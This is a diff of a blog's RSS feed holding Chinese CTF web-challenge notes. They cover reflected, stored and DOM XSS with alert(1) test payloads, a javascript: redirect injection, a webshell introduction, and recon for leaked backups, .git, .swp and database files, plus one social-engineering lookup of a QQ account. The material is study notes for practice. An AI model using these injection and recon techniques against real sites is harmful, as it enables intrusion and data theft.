+2.用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
+3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
+4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。&lt;/p&gt;
+&lt;p&gt;和上面的是一样的，存储型就是把恶意代码存储进了数据库，每次查库就会触发恶意代码。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Frederick2313072.github.io/p/ctfhub-web/image-20250210002745851.png&#34;
+	width=&#34;2273&#34;
+	height=&#34;909&#34;
+	srcset=&#34;https://Frederick2313072.github.io/p/ctfhub-web/image-20250210002745851_hu_9f63b06bcc08231d.png 480w, https://Frederick2313072.github.io/p/ctfhub-web/image-20250210002745851_hu_3ad1080b52924576.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;250&#34;
+		data-flex-basis=&#34;600px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;dom型xss攻击&#34;&gt;DOM型XSS攻击
+&lt;/h2&gt;&lt;p&gt;DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。&lt;/p&gt;
+&lt;p&gt;在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等&lt;/p&gt;
+&lt;p&gt;DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。&lt;/p&gt;
+&lt;p&gt;在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等
+DOM型XSS的攻击步骤&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;攻击者构造出特殊的 URL，其中包含恶意代码。
+用户打开带有恶意代码的 URL。
+用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
+恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;简单来说就是在前端页面上寻找注入点&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Frederick2313072.github.io/p/ctfhub-web/image-20250210005338187.png&#34;
+	width=&#34;493&#34;
+	height=&#34;183&#34;
+	srcset=&#34;https://Frederick2313072.github.io/p/ctfhub-web/image-20250210005338187_hu_b489dc8a8f7bc9c7.png 480w, https://Frederick2313072.github.io/p/ctfhub-web/image-20250210005338187_hu_f591e68f378cf687.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;269&#34;
+		data-flex-basis=&#34;646px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;通过构造html语法的闭合，将脚本输入进去，同前面一样&lt;/p&gt;
+&lt;h2 id=&#34;dom跳转&#34;&gt;DOM跳转
+&lt;/h2&gt;&lt;p&gt;审查源代码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Frederick2313072.github.io/p/ctfhub-web/image-20250210011106889.png&#34;
+	width=&#34;1266&#34;
+	height=&#34;717&#34;
+	srcset=&#34;https://Frederick2313072.github.io/p/ctfhub-web/image-20250210011106889_hu_53002c1e63f0ba58.png 480w, https://Frederick2313072.github.io/p/ctfhub-web/image-20250210011106889_hu_98aa4fcd4b2ddc64.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;176&#34;
+		data-flex-basis=&#34;423px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;注意！当你将类似于 location.href = &amp;ldquo;javascript:alert(&amp;lsquo;xss&amp;rsquo;)&amp;rdquo; 这样的代码赋值给 location.href 时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。&lt;/p&gt;
+&lt;p&gt;直接在网页url后面跟上代码测试反弹&lt;/p&gt;
+&lt;p&gt;?jumpto=javascript:alert(1);
+跟前面老步骤&lt;/p&gt;
+&lt;h2 id=&#34;文件上传&#34;&gt;文件上传
+&lt;/h2&gt;&lt;p&gt;文件上传漏洞服务端代码未对客户端上传的文件进行严格的验证，导致漏洞。非法用户可以利用上传的恶意文件控制整个网站，这个恶意文件被称为 WebShell ，也可以称为一种网页后门。
+1.1常见的WebShell有哪些？&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;拥有较完整功能的webshell，我们一般称为大马。
+功能简易的webshell称为小马。
+除此之外还存在一句话木马、菜刀马、脱库马等等的名词，是对于webShell功能或者特性的简称。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;1.2 一句话木马演示&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Python渗透测试</title>
         <link>https://Frederick2313072.github.io/p/python%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
         <pubDate>Sat, 08 Feb 2025 00:00:00 +0000</pubDate>
@@ -2615,167 +2913,6 @@ $$f_Y(y)=\frac{1}{\sqrt{2\pi}\sigma y}\mathrm{exp}\{-(\ln(y)-\mu)^2/2\sigma^2\}\
 &lt;/h2&gt;&lt;p&gt;之前自己做了个CSS模板，结果在运行cmd时被tailwind覆盖完了，没有git到远程仓库&amp;hellip;&amp;hellip;&lt;/p&gt;
 &lt;h2 id=&#34;数学分析3概率论&#34;&gt;数学分析3，概率论
 &lt;/h2&gt;&lt;p&gt;前者太难听不懂，后者太简单不想听&lt;/p&gt;
-</description>
-        </item>
-        <item>
-        <title></title>
-        <link>https://Frederick2313072.github.io/p/</link>
-        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-        
-        <guid>https://Frederick2313072.github.io/p/</guid>
-        <description>&lt;p&gt;HTTP请求：抓包，把GET换成CTFHUB&lt;/p&gt;
-&lt;p&gt;302跳转：网页临时移动到新的位置，而浏览器的缓存没有更新，flag在index.php下而跳转到index.html打开burp suite抓包，发送请求&lt;/p&gt;
-&lt;p&gt;cookie:验证身份 抓包repeater模块改成admin=1发送请求&lt;/p&gt;
-&lt;p&gt;基础认证：burpsuite字典爆破，加密&lt;/p&gt;
-&lt;p&gt;sql注入：结合burpsuite（前端没有回显），hackbar&lt;/p&gt;
-&lt;h2 id=&#34;xss攻击&#34;&gt;XSS攻击
-&lt;/h2&gt;&lt;p&gt;找一个xss网站，我找的是xssaq.com&lt;/p&gt;
-&lt;h3 id=&#34;反射型xss&#34;&gt;反射型XSS
-&lt;/h3&gt;&lt;p&gt;恶意 &lt;code&gt;JavaScript&lt;/code&gt; 脚本属于用户发送给网站请求中的一部分，随后网站又将这部分返回给用户，恶意脚本在页面中被执行。一般发生在前后端一体的应用中，服务端逻辑会改变最终的网页代码。&lt;/p&gt;
-&lt;p&gt;攻击步骤&lt;/p&gt;
-&lt;p&gt;1.攻击者构造出特殊的 URL，其中包含恶意代码。
-2.用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
-3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
-4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。&lt;/p&gt;
-&lt;p&gt;由于HTML文档具有扁平的、串行的结构，混合了控制语句、格式和实际内容，因此在结果页面中包含任何未经验证的用户提供的数据而没有进行正确的HTML编码，可能导致标记注入。一个经典的潜在攻击向量例子是站点搜索引擎：如果用户搜索一个字符串，搜索字符串通常会在结果页面上逐字显示，以表明搜索内容。如果该响应没有正确转义或拒绝HTML控制字符，就会导致跨站脚本漏洞。&lt;/p&gt;
-&lt;p&gt;反射型攻击通常通过电子邮件或一个中立的网站传递。诱饵是一个看似无害的URL，指向一个可信赖的网站，但包含XSS攻击向量。如果该可信赖的网站对该向量存在漏洞，点击链接可能会导致受害者的浏览器执行注入的脚本。&lt;/p&gt;
-&lt;p&gt;这里用最经典的paylaod来进行判断是否存在xss&lt;/p&gt;
-&lt;script&gt;alert(1)&lt;/script&gt;//这是语句是让浏览器弹框
-&lt;p&gt;题目中第二个输入框模拟受害者访问，这里的payload需要从xss平台中复制&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e6%b0%b4%e8%8d%89%e5%a7%90%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250210002218405.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250210002218405&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;在XSS网站上&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e6%b0%b4%e8%8d%89%e5%a7%90%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250210002314603.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250210002314603&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h2 id=&#34;存储型xss&#34;&gt;存储型XSS
-&lt;/h2&gt;&lt;p&gt;黑客将恶意 JavaScript 脚本长期保存在服务端数据库中，用户一旦访问相关页面数据，恶意脚本就会被执行。常见于搜索、微博、社区贴吧评论等。
-存储型 XSS 的攻击步骤：&lt;/p&gt;
-&lt;p&gt;1.攻击者将恶意代码提交到目标网站的数据库中。
-2.用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
-3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
-4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。&lt;/p&gt;
-&lt;p&gt;和上面的是一样的，存储型就是把恶意代码存储进了数据库，每次查库就会触发恶意代码。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e6%b0%b4%e8%8d%89%e5%a7%90%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250210002745851.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250210002745851&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h2 id=&#34;dom型xss攻击&#34;&gt;DOM型XSS攻击
-&lt;/h2&gt;&lt;p&gt;DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。&lt;/p&gt;
-&lt;p&gt;在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等&lt;/p&gt;
-&lt;p&gt;DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。&lt;/p&gt;
-&lt;p&gt;在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等
-DOM型XSS的攻击步骤&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;攻击者构造出特殊的 URL，其中包含恶意代码。
-用户打开带有恶意代码的 URL。
-用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
-恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;简单来说就是在前端页面上寻找注入点&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e6%b0%b4%e8%8d%89%e5%a7%90%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250210005338187.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250210005338187&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;通过构造html语法的闭合，将脚本输入进去，同前面一样&lt;/p&gt;
-&lt;h2 id=&#34;dom跳转&#34;&gt;DOM跳转
-&lt;/h2&gt;&lt;p&gt;审查源代码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e6%b0%b4%e8%8d%89%e5%a7%90%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250210011106889.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250210011106889&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;注意！当你将类似于 location.href = &amp;ldquo;javascript:alert(&amp;lsquo;xss&amp;rsquo;)&amp;rdquo; 这样的代码赋值给 location.href 时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。&lt;/p&gt;
-&lt;p&gt;直接在网页url后面跟上代码测试反弹&lt;/p&gt;
-&lt;p&gt;?jumpto=javascript:alert(1);
-跟前面老步骤&lt;/p&gt;
-&lt;h2 id=&#34;文件上传&#34;&gt;文件上传
-&lt;/h2&gt;&lt;p&gt;文件上传漏洞服务端代码未对客户端上传的文件进行严格的验证，导致漏洞。非法用户可以利用上传的恶意文件控制整个网站，这个恶意文件被称为 WebShell ，也可以称为一种网页后门。
-1.1常见的WebShell有哪些？&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;拥有较完整功能的webshell，我们一般称为大马。
-功能简易的webshell称为小马。
-除此之外还存在一句话木马、菜刀马、脱库马等等的名词，是对于webShell功能或者特性的简称。
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;1.2 一句话木马演示&lt;/p&gt;
-</description>
-        </item>
-        <item>
-        <title></title>
-        <link>https://Frederick2313072.github.io/p/</link>
-        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-        
-        <guid>https://Frederick2313072.github.io/p/</guid>
-        <description>&lt;p&gt;web2：view-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。 如果要在IE下查看源代码,只能使用查看中的&amp;quot;查看源代码&amp;quot;命令.以前的使用方法：在浏览器地址栏中输入 view-source: URL&lt;/p&gt;
-&lt;p&gt;web3:打开burp suite然后在仪表盘选择新扫描输入url（网址）后点击确定，然后点击目标，选择相应&amp;ndash;raw就可以看见flag了or F12 &amp;mdash;&amp;gt;选择网络&amp;mdash;&amp;gt;F5刷新页面，查看响应头。&lt;/p&gt;
-&lt;p&gt;web4：robots.txt（爬虫协议）&lt;/p&gt;
-&lt;p&gt;web5：目录扫描：index.phps(php文件)&lt;/p&gt;
-&lt;p&gt;phps文件泄露，phps存放着php源码,可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取.&lt;/p&gt;
-&lt;p&gt;web6：url/www.zip网站备份压缩文件 漏洞成因&lt;/p&gt;
-&lt;p&gt;在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。&lt;/p&gt;
-&lt;p&gt;当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。&lt;/p&gt;
-&lt;p&gt;该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。&lt;/p&gt;
-&lt;p&gt;该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。&lt;/p&gt;
-&lt;p&gt;被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。&lt;/p&gt;
-&lt;p&gt;.rar .zip .7z .tar.gz .bak .swp .txt&lt;/p&gt;
-&lt;p&gt;源码泄露 url/www.zip 得知隐藏目录/fl000g.txt&lt;/p&gt;
-&lt;p&gt;web7: dirsearch -u url 发现目录 /.git&lt;/p&gt;
-&lt;p&gt;web8 /.svn 代码版本管理工具&lt;/p&gt;
-&lt;p&gt;web9: 本题目的是让答题者了解到vim编辑器使用时会有一个缓存文件，这个缓存文件在保存时进行删除，但是在vim意外退出时这个缓存文件，会以源文件加一个.swp后缀进行保存，我们可以尝试访问这些文件来尝试获取一些文件。&lt;/p&gt;
-&lt;p&gt;/index.php.swp&lt;/p&gt;
-&lt;p&gt;web10:network cookie&lt;/p&gt;
-&lt;p&gt;本题目是让答题者了解到cookie，cookie一般用于在身份认证的过程中保存一些信息，用于服务器来验证身份,在测试中可以尝试注入等方式。可以使用burp/F12中的网络来查看&lt;/p&gt;
-&lt;p&gt;web11:dns查找域名&lt;/p&gt;
-&lt;p&gt;web12:查看robots.txt文件，用户名admin。密码：在页面的最下方 管理员界面：/admin&lt;/p&gt;
-&lt;p&gt;web13:/document.pdf，底部信息&lt;/p&gt;
-&lt;p&gt;本题目的是答题者了解到很多的文章有许多的文档，可以在这些文档中发现很多信息，例如文件中有许多的信息泄露的地方，本题在底部的document这个这个文本中记录到有地址和密码。&lt;/p&gt;
-&lt;p&gt;web14:根据提示 泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问&lt;/p&gt;
-&lt;p&gt;web15:/admin 忘记密码，密保问题。首先，在网页最下方发现一个邮箱，于是就去QQ上搜索了一下QQ号，只是发现了一个账号，地点是陕西西安，社工搜索，telegram暗精灵&lt;/p&gt;
-&lt;p&gt;web16:考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag&lt;/p&gt;
-&lt;p&gt;web17:/backup.sql 备份的sql文件&lt;/p&gt;
-&lt;p&gt;web18:这是一个javascript 的游戏，游戏的目的就是让要赢，从js代码中可知，当score&amp;gt;120时，且game_over这个参数为false时，即可赢，于是打开开发者模式中的console，直接赋值score=130 game_over=false 然后，执行游戏 的run() 即可得到 &amp;ldquo;你赢了，去幺幺零点皮爱吃皮看看&amp;rdquo;， 即，110.php 打开它，即得flag&lt;/p&gt;
-&lt;p&gt;web19:js查看源码，得知post提交账户密码，用hackbar&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e6%b0%b4%e8%8d%89%e5%a7%90%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250207213641400.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250207213641400&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;web20：mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}&lt;/p&gt;
 </description>
         </item>
         <item>
